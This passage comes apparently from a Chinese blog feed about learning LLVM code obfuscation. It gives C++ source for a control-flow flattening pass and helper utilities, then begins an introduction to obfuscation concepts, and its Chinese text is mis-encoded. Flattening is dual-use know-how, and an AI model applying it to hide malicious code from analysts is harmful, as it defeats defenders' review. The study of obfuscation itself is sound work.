class="keyword">public</span>:</span><br><span class="line">            <span class="type">static</span> <span class="type">char</span> ID;</span><br><span class="line">            <span class="built_in">Flattening</span>() : <span class="built_in">FunctionPass</span>(ID) &#123;</span><br><span class="line">                <span class="built_in">srand</span>(<span class="built_in">time</span>(<span class="number">0</span>));</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// å¯¹å‡½æ•° F è¿›è¡Œå¹³å¦åŒ–</span></span><br><span class="line">            <span class="function"><span class="type">void</span> <span class="title">flatten</span><span class="params">(Function &amp;F)</span></span>;</span><br><span class="line"></span><br><span class="line">            <span class="function"><span class="type">bool</span> <span class="title">runOnFunction</span><span class="params">(Function &amp;F)</span></span>;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125; <span class="comment">// namespace</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// runOnFunctionå‡½æ•°å®ç°</span></span><br><span class="line"><span class="type">bool</span> Flattening :: <span class="built_in">runOnFunction</span>(Function &amp;F)&#123;</span><br><span class="line">    <span class="built_in">INIT_CONTEXT</span>(F);</span><br><span class="line">    FunctionPass *pass = <span class="built_in">createSplitBasicBlockPass</span>();</span><br><span class="line">    pass-&gt;<span class="built_in">runOnFunction</span>(F);</span><br><span class="line">    <span class="built_in">flatten</span>(F);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Flattening::flatten</span><span class="params">(Function &amp;F)</span></span>&#123;</span><br><span class="line">    <span class="comment">// åŸºæœ¬å—æ•°é‡ä¸è¶…è¿‡1åˆ™æ— éœ€å¹³å¦åŒ–</span></span><br><span class="line">    <span class="keyword">if</span>(F.<span class="built_in">size</span>() &lt;= <span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//å°†é™¤å…¥å£å—ä»¥å¤–çš„åŸºæœ¬å—ä¿å­˜åˆ° vector å®¹å™¨ä¸­ï¼Œæ–¹ä¾¿åç»­å¤„ç†</span></span><br><span class="line">    <span class="comment">// é¦–å…ˆä¿å­˜æ‰€æœ‰åŸºæœ¬å—</span></span><br><span class="line">    vector&lt;BasicBlock*&gt; origBB;</span><br><span class="line">    <span class="keyword">for</span>(BasicBlock &amp;BB : F)&#123;</span><br><span class="line">        origBB.<span class="built_in">push_back</span>(&amp;BB);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ä» vector ä¸­å»é™¤ç¬¬ä¸€ä¸ªåŸºæœ¬å—</span></span><br><span class="line">    <span class="comment">// å› ä¸ºç¬¬ä¸€ä¸ªåŸºæœ¬å—ä¸€å®šæ˜¯å…¥å£å—</span></span><br><span class="line">    origBB.<span class="built_in">erase</span>(origBB.<span class="built_in">begin</span>());</span><br><span class="line">    BasicBlock &amp;entryBB = F.<span class="built_in">getEntryBlock</span>();</span><br><span class="line">    <span class="comment">// åˆ¤æ–­ï¼šå¦‚æœç¬¬ä¸€ä¸ªåŸºæœ¬å—çš„æœ«å°¾æ˜¯æ¡ä»¶è·³è½¬ -&gt; å•ç‹¬åˆ†ç¦»</span></span><br><span class="line">    <span class="comment">// dyn_castï¼šç”¨æ¥ç±»å‹åˆ¤æ–­å’Œç±»å‹è½¬æ¢ï¼Œå¦‚æœç»™å®šå‚æ•°ï¼ˆentryBB.getRerminator()ï¼‰ç¬¦åˆæƒ³è¦ç±»å‹ï¼ˆBranchInstï¼‰ï¼Œè¿›è¡Œè½¬æ¢ï¼Œè½¬æ¢æˆï¼ˆBranchInst *brï¼‰ï¼Œå¦‚æœä¸ç¬¦åˆç±»å‹ï¼Œè¿”å›ä¸€ä¸ª nullptr ç©ºæŒ‡é’ˆ</span></span><br><span class="line">    <span class="keyword">if</span>(BranchInst *br = <span class="built_in">dyn_cast</span>&lt;BranchInst&gt;(entryBB.<span class="built_in">getTerminator</span>()))&#123;</span><br><span class="line">        <span class="keyword">if</span>(br-&gt;<span class="built_in">isConditional</span>())&#123;</span><br><span class="line">            <span class="comment">// åˆ†ç¦»è·³è½¬æŒ‡ä»¤ä½œä¸ºæ–°åŸºæœ¬å¿«ï¼Œæ’å…¥åˆ° vector å®¹å™¨æœ€å‰ç«¯</span></span><br><span class="line">            BasicBlock *newBB = entryBB.<span class="built_in">splitBasicBlock</span>(br, <span class="string">&quot;newBB&quot;</span>);</span><br><span class="line">            origBB.<span class="built_in">insert</span>(origBB.<span class="built_in">begin</span>(), newBB);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// åˆ›å»ºåˆ†å‘å—å’Œè¿”å›å—</span></span><br><span class="line">    BasicBlock *dispatchBB = BasicBlock::<span class="built_in">Create</span>(*CONTEXT, <span class="string">&quot;dispatchBB&quot;</span>, &amp;F, &amp;entryBB);</span><br><span class="line">    BasicBlock *returnBB = BasicBlock::<span class="built_in">Create</span>(*CONTEXT, <span class="string">&quot;returnBB&quot;</span>, &amp;F, &amp;entryBB);</span><br><span class="line">    <span class="comment">// æ­¤æ—¶çš„å—é¡ºåºå¦‚ä¸‹</span></span><br><span class="line">    <span class="comment">/*-----------------------</span></span><br><span class="line"><span class="comment">        åˆ†å‘å—</span></span><br><span class="line"><span class="comment">        è¿”å›å—</span></span><br><span class="line"><span class="comment">        å…¥å£å—</span></span><br><span class="line"><span class="comment">    -----------------------*/</span></span><br><span class="line">    <span class="comment">// å»ºç«‹åˆ†å‘å—å’Œè¿”å›å—çš„é“¾æ¥</span></span><br><span class="line">    BranchInst::<span class="built_in">Create</span>(dispatchBB, returnBB);</span><br><span class="line">    <span class="comment">// æŠŠå…¥å£å—ç§»åˆ°æœ€å‰é¢ï¼Œåˆ†å‘å—å‰é¢</span></span><br><span class="line">    entryBB.<span class="built_in">moveBefore</span>(dispatchBB);</span><br><span class="line">    <span class="comment">// æ­¤æ—¶çš„å—é¡ºåºå¦‚ä¸‹</span></span><br><span class="line">    <span class="comment">/*-----------------------</span></span><br><span class="line"><span class="comment">        å…¥å£å—</span></span><br><span class="line"><span class="comment">        åˆ†å‘å—</span></span><br><span class="line"><span class="comment">        è¿”å›å—</span></span><br><span class="line"><span class="comment">    -----------------------*/</span></span><br><span class="line">    <span class="comment">// å»é™¤å…¥å£å—æœ«å°¾çš„è·³è½¬</span></span><br><span class="line">    entryBB.<span class="built_in">getTerminator</span>()-&gt;<span class="built_in">eraseFromParent</span>();</span><br><span class="line">    <span class="comment">// ä½¿å…¥å£å—è·³è½¬åˆ° dispatchBBï¼ŒbrDispatchBB ä¹Ÿå°±æ˜¯å…¥å£å—çš„ç»ˆç»“æŒ‡ä»¤</span></span><br><span class="line">    BranchInst *brDispatchBB = BranchInst::<span class="built_in">Create</span>(dispatchBB, &amp;entryBB);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// åœ¨å…¥å£å—æ’å…¥ alloca å’Œ store æŒ‡ä»¤åˆ›å»ºå¹¶åˆå§‹åŒ– switch å˜é‡ï¼Œåˆå§‹å€¼ä¸ºéšæœºå€¼</span></span><br><span class="line">    <span class="type">int</span> randNumCase = <span class="built_in">rand</span>();</span><br><span class="line">    <span class="comment">// åœ¨å…¥å£å—è·³è½¬åˆ†å‘å—æŒ‡ä»¤ï¼ˆbrDispatchBBï¼‰ä¹‹å‰æ’å…¥ä¸€æ¡ç”³è¯·åˆ†é…å†…å­˜çš„æŒ‡ä»¤ï¼Œä½¿ç”¨ AllocaInst çš„æ„é€ å‡½æ•°</span></span><br><span class="line">    AllocaInst *swVarPtr = <span class="keyword">new</span> <span class="built_in">AllocaInst</span>(TYPE_I32, <span class="number">0</span>, <span class="string">&quot;swVar.ptr&quot;</span>, brDispatchBB);</span><br><span class="line">    <span class="comment">// åœ¨å…¥å£å—è·³è½¬åˆ†å‘å—æŒ‡ä»¤ï¼ˆbrDispatchBBï¼‰ä¹‹å‰æ’å…¥ä¸€æ¡å†…å­˜å­˜å‚¨çš„æŒ‡ä»¤</span></span><br><span class="line">    <span class="keyword">new</span> <span class="built_in">StoreInst</span>(<span class="built_in">CONST_I32</span>(randNumCase), swVarPtr, brDispatchBB);</span><br><span class="line">    <span class="comment">// åœ¨åˆ†å‘å—æ’å…¥ load æŒ‡ä»¤è¯»å– switch å˜é‡</span></span><br><span class="line">    LoadInst *swVar = <span class="keyword">new</span> <span class="built_in">LoadInst</span>(TYPE_I32, swVarPtr, <span class="string">&quot;swVar&quot;</span>, <span class="literal">false</span>, dispatchBB);</span><br><span class="line">    <span class="comment">// åœ¨è¿”å›å—å‰åˆ›å»º switch é»˜è®¤è·³è½¬çš„åŸºæœ¬å—</span></span><br><span class="line">    BasicBlock *swDefault = BasicBlock::<span class="built_in">Create</span>(*CONTEXT, <span class="string">&quot;seDefault&quot;</span>, &amp;F, returnBB);</span><br><span class="line">    <span class="comment">// switch é»˜è®¤è·³è½¬çš„åŸºæœ¬å—é»˜è®¤è·³è½¬åˆ°è¿”å›å—</span></span><br><span class="line">    BranchInst::<span class="built_in">Create</span>(returnBB, swDefault);</span><br><span class="line">    <span class="comment">// åœ¨åˆ†å‘å—æœ«å°¾çš„ switch å—ä¸­æ·»åŠ  switch æŒ‡ä»¤</span></span><br><span class="line">    SwitchInst *swInst = SwitchInst::<span class="built_in">Create</span>(swVar, swDefault, <span class="number">0</span>, dispatchBB);</span><br><span class="line">    <span class="comment">// å°†åŸåŸºæœ¬å—æ’å…¥åˆ°è¿”å›å—ä¹‹å‰ï¼Œå¹¶åˆ†é… case å€¼</span></span><br><span class="line">    <span class="keyword">for</span>(BasicBlock *BB : origBB)&#123;</span><br><span class="line">        BB-&gt;<span class="built_in">moveBefore</span>(returnBB);</span><br><span class="line">        swInst-&gt;<span class="built_in">addCase</span>(<span class="built_in">CONST_I32</span>(randNumCase), BB);</span><br><span class="line">        randNumCase = <span class="built_in">rand</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// åœ¨æ¯ä¸ªåŸºæœ¬å—æœ€åæ·»åŠ ä¿®æ”¹ switch å˜é‡çš„æŒ‡ä»¤å’Œè·³è½¬åˆ°è¿”å›å—çš„æŒ‡ä»¤</span></span><br><span class="line">    <span class="keyword">for</span>(BasicBlock *BB : origBB)&#123;</span><br><span class="line">        <span class="comment">// retn BB</span></span><br><span class="line">        <span class="keyword">if</span>(BB-&gt;<span class="built_in">getTerminator</span>()-&gt;<span class="built_in">getNumSuccessors</span>() == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// éæ¡ä»¶è·³è½¬</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(BB-&gt;<span class="built_in">getTerminator</span>()-&gt;<span class="built_in">getNumSuccessors</span>() == <span class="number">1</span>)&#123;</span><br><span class="line">            <span class="comment">// è·å–åç»§å—</span></span><br><span class="line">            BasicBlock *sucBB = BB-&gt;<span class="built_in">getTerminator</span>()-&gt;<span class="built_in">getSuccessor</span>(<span class="number">0</span>);</span><br><span class="line">            <span class="comment">// åˆ é™¤åŸºæœ¬å—æœ€åä¸€æ¡è·³è½¬åˆ°åç»§å—çš„æŒ‡ä»¤</span></span><br><span class="line">            BB-&gt;<span class="built_in">getTerminator</span>()-&gt;<span class="built_in">eraseFromParent</span>();</span><br><span class="line">            <span class="comment">// è·å–åç»§å—çš„ case å€¼ï¼Œï¼ˆå¸¸é‡ç±»å‹ï¼‰</span></span><br><span class="line">            ConstantInt *numCase = swInst-&gt;<span class="built_in">findCaseDest</span>(sucBB);</span><br><span class="line">            <span class="comment">// æŠŠ switch å˜é‡ä¿®æ”¹æˆå®ƒçš„åç»§å—çš„ case å€¼ï¼Œä¸‹ä¸€è½®è¿›å…¥åˆ†å‘å—å°±æ ¹æ®è¿™ä¸ªå€¼è·³è½¬åˆ°åç»§å—</span></span><br><span class="line">            <span class="keyword">new</span> <span class="built_in">StoreInst</span>(numCase, swVarPtr, BB);</span><br><span class="line">            <span class="comment">// åŸºæœ¬å—è·³è½¬åˆ°è¿”å›å—</span></span><br><span class="line">            BranchInst::<span class="built_in">Create</span>(returnBB, BB);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// æ¡ä»¶è·³è½¬</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(BB-&gt;<span class="built_in">getTerminator</span>()-&gt;<span class="built_in">getNumSuccessors</span>() == <span class="number">2</span>)&#123;</span><br><span class="line">            ConstantInt *numCaseTrue = swInst-&gt;<span class="built_in">findCaseDest</span>(BB-&gt;<span class="built_in">getTerminator</span>()-&gt;<span class="built_in">getSuccessor</span>(<span class="number">0</span>));</span><br><span class="line">            ConstantInt *numCaseFalse = swInst-&gt;<span class="built_in">findCaseDest</span>(BB-&gt;<span class="built_in">getTerminator</span>()-&gt;<span class="built_in">getSuccessor</span>(<span class="number">1</span>));</span><br><span class="line">            BranchInst *br = <span class="built_in">cast</span>&lt;BranchInst&gt;(BB-&gt;<span class="built_in">getTerminator</span>());</span><br><span class="line">            <span class="comment">// åˆ›å»º select æŒ‡ä»¤åˆ¤æ–­éœ€è¦ä¿®æ”¹å“ªä¸€ä¸ª case å€¼</span></span><br><span class="line">            SelectInst *sel = SelectInst::<span class="built_in">Create</span>(br-&gt;<span class="built_in">getCondition</span>(), numCaseTrue, numCaseFalse, <span class="string">&quot;&quot;</span>, BB-&gt;<span class="built_in">getTerminator</span>());</span><br><span class="line">            <span class="comment">// åˆ é™¤åŸºæœ¬å—æœ€åä¸€æ¡è·³è½¬åˆ°åç»§å—çš„æŒ‡ä»¤</span></span><br><span class="line">            BB-&gt;<span class="built_in">getTerminator</span>()-&gt;<span class="built_in">eraseFromParent</span>();</span><br><span class="line">            <span class="comment">// æŠŠ switch å˜é‡ä¿®æ”¹æˆå®ƒçš„åç»§å—çš„ case å€¼ï¼Œä¸‹ä¸€è½®è¿›å…¥åˆ†å‘å—å°±æ ¹æ®è¿™ä¸ªå€¼è·³è½¬åˆ°åç»§å—</span></span><br><span class="line">            <span class="keyword">new</span> <span class="built_in">StoreInst</span>(sel, swVarPtr, BB);</span><br><span class="line">            <span class="comment">// åŸºæœ¬å—è·³è½¬åˆ°è¿”å›å—</span></span><br><span class="line">            BranchInst::<span class="built_in">Create</span>(returnBB, BB);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">fixStack</span>(F);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// https://www.leadroyal.cn/p/1072/</span></span><br><span class="line"><span class="comment">// æ–¹æ¡ˆä¸€ï¼š æ³¨å†Œé˜¶æ®µï¼Œå°†LowerSwitchPassæ”¾åˆ°Flattenå‰ï¼Œæ‰§è¡Œæ—¶æŒ‰é¡ºåºæ‰§è¡Œå³å¯ã€‚</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> LLVM_VERSION_MAJOR &gt;= 9</span></span><br><span class="line">  <span class="comment">// <span class="doctag">FIXME:</span> Pass has not been inserted into a PassManager object!</span></span><br><span class="line">    <span class="comment">// &gt;=9.0, LowerSwitchPass depends on LazyValueInfoWrapperPass, which cause AssertError.</span></span><br><span class="line">    <span class="comment">// So I move LowerSwitchPass into register function, just before FlatteningPass.</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">    FunctionPass *lower = <span class="built_in">createLowerSwitchPass</span>();</span><br><span class="line">    lower-&gt;<span class="built_in">runOnFunction</span>(*F);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> Flattening :: ID = <span class="number">0</span>;</span><br><span class="line"><span class="comment">// æ³¨å†Œè¯¥ Flattening Pass</span></span><br><span class="line"><span class="function"><span class="type">static</span> RegisterPass&lt;Flattening&gt; <span class="title">x</span><span class="params">(<span class="string">&quot;fla&quot;</span>, <span class="string">&quot;My control flow flattening obfuscation.&quot;</span>)</span></span>;</span><br></pre></td></tr></table></figure><h2 id="Utils-cpp"><a href="#Utils-cpp" class="headerlink" title="Utils.cpp"></a>Utils.cpp</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;../include/Utils.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/IR/Instructions.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/Transforms/Utils/Local.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/Transforms/Utils/ValueMapper.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/Transforms/Utils/Cloning.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> std::vector;</span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> llvm;</span><br><span class="line"></span><br><span class="line">LLVMContext *CONTEXT = <span class="literal">nullptr</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">llvm::fixStack</span><span class="params">(Function &amp;F)</span> </span>&#123;</span><br><span class="line">    vector&lt;PHINode*&gt; origPHI;</span><br><span class="line">    vector&lt;Instruction*&gt; origReg;</span><br><span class="line">    BasicBlock &amp;entryBB = F.<span class="built_in">getEntryBlock</span>();</span><br><span class="line">    <span class="keyword">for</span>(BasicBlock &amp;BB : F)&#123;</span><br><span class="line">        <span class="keyword">for</span>(Instruction &amp;I : BB)&#123;</span><br><span class="line">            <span class="keyword">if</span>(PHINode *PN = <span class="built_in">dyn_cast</span>&lt;PHINode&gt;(&amp;I))&#123;</span><br><span class="line">                origPHI.<span class="built_in">push_back</span>(PN);</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(!(<span class="built_in">isa</span>&lt;AllocaInst&gt;(&amp;I) &amp;&amp; I.<span class="built_in">getParent</span>() == &amp;entryBB) </span><br><span class="line">                &amp;&amp; I.<span class="built_in">isUsedOutsideOfBlock</span>(&amp;BB))&#123;</span><br><span class="line">                origReg.<span class="built_in">push_back</span>(&amp;I);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(PHINode *PN : origPHI)&#123;</span><br><span class="line">        <span class="built_in">DemotePHIToStack</span>(PN, entryBB.<span class="built_in">getTerminator</span>());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(Instruction *I : origReg)&#123;</span><br><span class="line">        <span class="built_in">DemoteRegToStack</span>(*I, entryBB.<span class="built_in">getTerminator</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Utils-h"><a href="#Utils-h" class="headerlink" title="Utils.h"></a>Utils.h</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> _UTILS_H_</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _UTILS_H_</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/IR/Function.h&quot;</span></span></span><br><span class="line"><span class="comment">// è·å–å½“å‰å‡½æ•° context</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INIT_CONTEXT(F) CONTEXT=&amp;F.getContext()</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TYPE_I32 Type::getInt32Ty(*CONTEXT)</span></span><br><span class="line"><span class="comment">// åˆ›å»ºå¸¸é‡</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CONST_I32(V) ConstantInt::get(TYPE_I32, V, false)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CONST(T, V) ConstantInt::get(T, V)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> llvm::LLVMContext *CONTEXT;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å¯¹ PHI æŒ‡ä»¤å’Œé€ƒé€¸å˜é‡è¿›è¡Œä¿®å¤å‡½æ•°ï¼Œæ·»åŠ åˆ°å‘½åç©ºé—´ llvm é‡Œ</span></span><br><span class="line"><span class="keyword">namespace</span> llvm&#123;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">fixStack</span><span class="params">(Function &amp;F)</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> hackæŠ€æœ¯ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ä»£ç æ··æ·† </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>llvmä»£ç æ··æ·†å­¦ä¹ ï¼ˆå››ï¼‰</title>
      <link href="/posts/8230/"/>
      <url>/posts/8230/</url>
      
        <content type="html"><![CDATA[<blockquote><p>å†™åœ¨å‰é¢</p><p>éšä¾¿å­¦å­¦ llvm ä»£ç æ··æ·†ï¼Œé¡ºä¾¿åšä¸ªæ¯•è®¾ï¼Œæ°´å‡ ç¯‡æ–‡ç« å°±å½“åšåšç¬”è®°</p></blockquote><h1 id="ä»£ç æ··æ·†åŸºæœ¬åŸç†"><a href="#ä»£ç æ··æ·†åŸºæœ¬åŸç†" class="headerlink" title="ä»£ç æ··æ·†åŸºæœ¬åŸç†"></a>ä»£ç æ··æ·†åŸºæœ¬åŸç†</h1><h2 id="æœ¯è¯­ä»‹ç»"><a href="#æœ¯è¯­ä»‹ç»" class="headerlink" title="æœ¯è¯­ä»‹ç»"></a>æœ¯è¯­ä»‹ç»</h2><h3 id="ä»£ç æ··æ·†"><a href="#ä»£ç æ··æ·†" class="headerlink" title="ä»£ç æ··æ·†"></a>ä»£ç æ··æ·†</h3><p>ä»£ç æ··æ·†æ˜¯å°†è®¡ç®—æœºç¨‹åºçš„ä»£ç ï¼Œè½¬æ¢æˆä¸€ç§åŠŸèƒ½ä¸Šç­‰ä»·ï¼Œä½†æ˜¯éš¾ä»¥é˜…è¯»å’Œç†è§£çš„å½¢å¼çš„è¡Œä¸ºã€‚</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/image-20230213153958210.png" alt="image-20230213153958210"></p><h3 id="å‡½æ•°"><a href="#å‡½æ•°" class="headerlink" title="å‡½æ•°"></a>å‡½æ•°</h3><p>å‡½æ•°æ˜¯ä»£ç æ··æ·†çš„åŸºæœ¬å•ä½ï¼Œä¸€ä¸ªå‡½æ•°ç”±è‹¥å¹²ä¸ªåŸºæœ¬å—ç»„æˆï¼Œæœ‰ä¸”ä»…æœ‰ä¸€ä¸ªå…¥å£å—ï¼Œå¯èƒ½æœ‰å¤šä¸ªå‡ºå£å—ã€‚</p><p>ä¸€ä¸ªå‡½æ•°å¯ä»¥ç”¨ä¸€ä¸ªæ§åˆ¶æµå›¾ï¼ˆControl Flow Graphï¼ŒCFGï¼‰æ¥è¡¨ç¤ºã€‚</p><h3 id="åŸºæœ¬å—"><a href="#åŸºæœ¬å—" class="headerlink" title="åŸºæœ¬å—"></a>åŸºæœ¬å—</h3><p>åŸºæœ¬å—ç”±ä¸€ç»„çº¿æ€§æŒ‡ä»¤ç»„æˆï¼Œæ¯ä¸€ä¸ªåŸºæœ¬å—éƒ½æœ‰ä¸€ä¸ªå…¥å£ç‚¹ï¼ˆç¬¬ä¸€æ¡æ‰§è¡Œçš„å‘½ä»¤ï¼‰å’Œä¸€ä¸ªå‡ºå£ç‚¹ï¼ˆæœ€åä¸€æ¡æ‰§è¡Œçš„æŒ‡ä»¤ï¼Œä¹Ÿå³ç»ˆç»“æŒ‡ä»¤ï¼‰ã€‚</p><p>ç»ˆç»“æŒ‡ä»¤è¦ä¹ˆè·³è½¬åˆ°å¦ä¸€ä¸ªåŸºæœ¬å—ï¼ˆbrï¼Œswitchï¼‰ï¼Œè¦ä¹ˆä»å‡½æ•°è¿”å›ï¼ˆretï¼‰ã€‚</p><h3 id="æ§åˆ¶æµ"><a href="#æ§åˆ¶æµ" class="headerlink" title="æ§åˆ¶æµ"></a>æ§åˆ¶æµ</h3><p>æ§åˆ¶æµä»£è¡¨äº†ä¸€ä¸ªç¨‹åºåœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­å¯èƒ½éå†åˆ°çš„æ‰€æœ‰è·¯å¾„ã€‚</p><p>é€šå¸¸æƒ…å†µä¸‹ï¼Œç¨‹åºçš„æ§åˆ¶æµå¾ˆæ¸…æ™°çš„åæ˜ äº†ç¨‹åºçš„é€»è¾‘ï¼Œä½†ç»è¿‡æ··æ·†çš„æ§åˆ¶æµä¼šä½¿å¾—äººä»¬éš¾ä»¥åˆ†è¾¨æ­£å¸¸é€»è¾‘ã€‚</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/image-20230213212740892.png" alt="image-20230213212740892"></p><h3 id="ä¸é€æ˜è°“è¯"><a href="#ä¸é€æ˜è°“è¯" class="headerlink" title="ä¸é€æ˜è°“è¯"></a>ä¸é€æ˜è°“è¯</h3><p>ä¸é€æ˜è°“è¯æŒ‡çš„æ˜¯å…¶å€¼ä¸ºæ··æ·†è€…æ˜ç¡®çŸ¥æ™“ï¼Œä½†æ˜¯åæ··æ·†è€…å´éš¾ä»¥æ¨æ–­çš„å˜é‡ã€‚</p><p>ä¾‹å¦‚æ··æ·†è€…åœ¨ç¨‹åºä¸­ä½¿ç”¨ä¸€ä¸ªæ’ä¸º 0 çš„å…¨å±€å˜é‡ï¼Œåæ··æ·†è€…éš¾ä»¥æ¨æ–­è¿™ä¸ªå˜é‡æ’ä¸º 0ã€‚</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/image-20230213212900831.png" alt="image-20230213212900831"></p><h2 id="å¸¸è§çš„æ··æ·†æ€è·¯"><a href="#å¸¸è§çš„æ··æ·†æ€è·¯" class="headerlink" title="å¸¸è§çš„æ··æ·†æ€è·¯"></a>å¸¸è§çš„æ··æ·†æ€è·¯</h2><h3 id="ç¬¦å·æ··æ·†"><a href="#ç¬¦å·æ··æ·†" class="headerlink" title="ç¬¦å·æ··æ·†"></a>ç¬¦å·æ··æ·†</h3><p>å°†å‡½æ•°çš„ç¬¦å·ï¼Œå¦‚å‡½æ•°åã€å…¨å±€å˜é‡åå»é™¤æˆ–è€…æ··æ·†ã€‚å¯¹äº ELF æ–‡ä»¶å¯ä»¥é€šè¿‡ strip æŒ‡ä»¤å»é™¤ç¬¦å·è¡¨å®Œæˆã€‚</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/image-20230213213027766.png" alt="image-20230213213027766"></p><h3 id="æ§åˆ¶æµæ··æ·†"><a href="#æ§åˆ¶æµæ··æ·†" class="headerlink" title="æ§åˆ¶æµæ··æ·†"></a>æ§åˆ¶æµæ··æ·†</h3><p>æ§åˆ¶æµæ··æ·†æŒ‡çš„æ˜¯æ··æ·†ç¨‹åºçš„æ­£å¸¸çš„æ§åˆ¶æµï¼Œä½¿å…¶åœ¨åŠŸèƒ½ä¿æŒä¸å˜çš„æƒ…å†µä¸‹ä¸èƒ½æ¸…æ™°çš„åæ˜ åŸæœ¬ç¨‹åºçš„æ­£å¸¸é€»è¾‘ã€‚</p><p>ç»å…¸çš„æ§åˆ¶æµæ··æ·†æœ‰ï¼šæ§åˆ¶æµå¹³å¦åŒ–ã€è™šå‡æ§åˆ¶æµã€éšæœºæ§åˆ¶æµã€‚</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/image-20230213213132828.png" alt="image-20230213213132828"></p><h3 id="è®¡ç®—æ··æ·†"><a href="#è®¡ç®—æ··æ·†" class="headerlink" title="è®¡ç®—æ··æ·†"></a>è®¡ç®—æ··æ·†</h3><p>è®¡ç®—æ··æ·†æŒ‡çš„æ˜¯æ··æ·†ç¨‹åºçš„è®¡ç®—æµç¨‹ï¼Œæˆ–è®¡ç®—æµç¨‹ä¸­ä½¿ç”¨çš„æ•°æ®ï¼Œä½¿åˆ†æè€…éš¾ä»¥åˆ†è¾¨æŸä¸€æ®µä»£ç 